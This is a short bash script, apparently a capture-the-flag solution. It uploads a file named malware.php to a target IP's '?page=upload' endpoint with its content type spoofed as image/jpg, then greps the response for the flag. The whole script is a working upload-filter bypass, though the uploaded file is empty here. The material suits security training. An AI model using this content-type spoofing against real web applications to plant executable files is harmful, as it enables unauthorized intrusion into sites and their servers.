#!/bin/bash

MALWARE=/tmp/malware.php
fileToUpload="uploaded=@${MALWARE};type=image/jpg"

function upload() {
	touch $MALWARE
	url="http://$1/?page=upload"
	req=$(curl -X POST -F "Upload=submit" -F ${fileToUpload} ${url} --silent)
	res=$(echo ${req} | grep -oE 'The flag is : [[:alnum:]]{1,100}')
	echo ${res}
}

if [ "$#" -ne 1 ]
then
	echo "usage: sh upload.sh \`ip\`"
else
	upload $1
fi
